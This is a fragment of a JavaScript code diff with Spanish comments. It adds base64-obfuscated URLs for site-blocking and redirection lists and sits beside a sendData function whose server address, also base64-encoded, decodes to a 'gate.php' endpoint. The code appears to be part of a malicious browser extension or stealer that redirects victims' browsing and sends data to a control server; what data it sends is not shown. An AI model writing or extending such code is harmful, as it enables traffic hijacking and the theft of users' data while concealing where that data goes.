@@ -1,3 +1,10 @@
+//Url del fichero de sitio a bloquear codificada en base64-----------------
+export var codeFs = "aHR0cDovLzE5Mi4xNjguMS40Mi9maWNoZXJvMy50eHQ="
+
+//Url del fichero de sitio para redireccionar codificada en base64---------
+export var codeFr = "aHR0cDovLzE5Mi4xNjguMS40Mi9maWNoZXJvNC50eHQ="
+
+//Funcion de envio de datos al servidor------------------------------------
 export function sendData(data, mode) {
 	//Url del servidor codificada en base64
 	var codeSvr = "aHR0cDovLzE5Mi4xNjguMS40Mi9nYXRlLnBocA==" 
